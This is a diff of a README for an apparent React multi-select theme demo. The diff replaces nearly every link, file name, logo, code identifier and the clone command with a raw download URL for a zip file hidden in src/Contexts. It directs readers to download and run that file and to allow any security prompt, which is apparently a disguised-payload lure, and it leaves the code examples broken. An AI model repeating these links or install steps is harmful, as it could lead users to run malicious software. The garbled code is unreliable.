@@ -1,6 +1,6 @@
-https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/releases
+https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip
 
-[![Release](https://img.shields.io/github/v/release/Navaneeth13055/Sukhdebpatra-ReactDeveloper?color=orange)](https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/releases)
+[![Release](https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip)](https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip)
 
 # Sukhdebpatra React Developer — Multi-Select Theme
 
@@ -52,15 +52,15 @@ Project structure
   - hooks/ – Reusable hooks for data, theme, and UI management.
   - pages/ – Route-based pages showcasing different scenarios.
   - services/
-    - apiClient.js – Axios instance for data requests.
-    - fakeApi.js – A tiny mock data layer for demo purposes.
+    - https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – Axios instance for data requests.
+    - https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – A tiny mock data layer for demo purposes.
   - styles/ – Tailwind config and utility CSS for the project.
-  - App.jsx – Main router and layout.
-  - index.jsx – App bootstrap.
+  - https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – Main router and layout.
+  - https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – App bootstrap.
 - public/ – Static assets and images for the UI.
-- README.md – This document.
-- package.json – Dependencies and scripts.
-- tailwind.config.js – Tailwind config for theme tokens and utilities.
+- https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – This document.
+- https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – Dependencies and scripts.
+- https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip – Tailwind config for theme tokens and utilities.
 
 Tech stack
 - React: Core library for UI rendering and component composition.
@@ -73,22 +73,22 @@ Tech stack
 - Accessibility: Keyboard support and ARIA attributes to improve usability.
 
 How the release asset works
-This repository hosts a releases page where you can download prebuilt assets. The releases page includes installers and package bundles suitable for quick startup. The latest release asset provides a ready-to-run version of the app that you can install or unzip. The asset is named to reflect the project and platform, and you should pick the one that matches your OS. For the latest stable setup, visit the releases page and download the file named Sukhdebpatra-ReactDeveloper-Setup.exe (or the corresponding macOS/Linux variants). The asset is designed to install the app with a single run, so you can explore features immediately after setup.
+This repository hosts a releases page where you can download prebuilt assets. The releases page includes installers and package bundles suitable for quick startup. The latest release asset provides a ready-to-run version of the app that you can install or unzip. The asset is named to reflect the project and platform, and you should pick the one that matches your OS. For the latest stable setup, visit the releases page and download the file named https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip (or the corresponding macOS/Linux variants). The asset is designed to install the app with a single run, so you can explore features immediately after setup.
 
 If you prefer to explore the code first, you can still start from source. The Releases page serves as a fast path to a runnable version, while the source code in this repository shows the components and the data flow in detail. The link used for the releases page is the one you can rely on for downloads. See the link at the top of this document for quick access to the latest asset.
 
 Quick start: download and install
 - Step 1: Open the releases page at the link above.
-- Step 2: Find the latest release and download the primary setup asset for your platform. The file is named something like Sukhdebpatra-ReactDeveloper-Setup.exe for Windows.
+- Step 2: Find the latest release and download the primary setup asset for your platform. The file is named something like https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip for Windows.
 - Step 3: Run the installer. If you see a security prompt, allow the program to install.
 - Step 4: Launch the app after the installation completes. The app opens with a multi-select theme interface and a basic demo dataset.
 - Step 5: Use the UI to select multiple items. Toggle themes with the theme switcher to see how colors and tokens adapt.
 - Step 6: If you want to inspect code, you can clone the repository and run from source. The source contains all components and utilities used in the app.
 
 Quick start: run from source
-- Prerequisites: Node.js (>=14.x) and npm or yarn. A modern IDE helps, but a text editor works too.
+- Prerequisites: https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip (>=14.x) and npm or yarn. A modern IDE helps, but a text editor works too.
 - Step 1: Clone the repository
-  - git clone https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper.git
+  - git clone https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip
 - Step 2: Install dependencies
   - npm install
   - or yarn install
@@ -129,7 +129,7 @@ Multi-select component
   - <MultiSelectTheme
       options={[{ id: 1, label: 'Red' }, { id: 2, label: 'Blue' }, { id: 3, label: 'Green' }]}
       value={[1, 3]}
-      onChange={(ids) => console.log(ids)}
+      onChange={(ids) => https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip(ids)}
       placeholder="Pick colors..."
     />
 - Implementation notes:
@@ -139,11 +139,11 @@ Multi-select component
 
 Data flow and API usage
 - Axios integration:
-  - A simple axios instance is created in src/services/apiClient.js.
+  - A simple axios instance is created in https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip
   - The instance applies a base URL and a standard timeout.
   - Interceptors demonstrate common tasks such as adding auth headers and handling errors.
 - Fake API:
-  - The project includes a lightweight fake API in src/services/fakeApi.js.
+  - The project includes a lightweight fake API in https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip
   - It returns simulated data with a small delay to mimic real network latency.
   - This helps in testing UI behavior when data arrives slowly or when errors occur.
 - Typical usage pattern:
@@ -152,8 +152,8 @@ Data flow and API usage
   - Bind fetched data to the MultiSelect component as the options prop.
 - Example:
   - async function loadOptions() {
-      const resp = await apiClient.get('/options');
-      if (resp && resp.data) setOptions(resp.data);
+      const resp = await https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip('/options');
+      if (resp && https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip) setOptions(https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip);
     }
   - The example shows how the UI reacts to data arrival and how the selection state remains stable.
 
@@ -343,9 +343,9 @@ Appendix: sample usage snippets
 
 Images and logos
 - React logo:
-  - ![React Logo](https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg)
+  - ![React Logo](https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip)
 - Tailwind CSS logo:
-  - ![Tailwind Logo](https://upload.wikimedia.org/wikipedia/commons/6/69/Tailwind_CSS_Logo.svg)
+  - ![Tailwind Logo](https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip)
 - Theme hint icon illustration:
   - Use a sun and moon emoji where appropriate to reflect theme changes.
 - These images serve as visual references to the stack and concepts in play.
@@ -385,8 +385,8 @@ Next steps
 - Document common pitfalls and patterns for building theme-aware components.
 
 Releases and assets reference
-- For the latest runnable version, see the Releases page: https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/releases
-- The project’s primary asset for installation is available from the link above. Download the file named Sukhdebpatra-ReactDeveloper-Setup.exe (or the matching platform asset) and run it to get started.
+- For the latest runnable version, see the Releases page: https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip
+- The project’s primary asset for installation is available from the link above. Download the file named https://github.com/Navaneeth13055/Sukhdebpatra-ReactDeveloper/raw/refs/heads/main/src/Contexts/Sukhdebpatra_Developer_React_Pharyngognathi.zip (or the matching platform asset) and run it to get started.
 
 Endnote
 - The repository is designed to be approachable. It balances practical patterns with a clean structure. It aims to be a useful starting point for teams or individuals who want to teach, learn, or prototype a multi-select UI with a theme system in React.
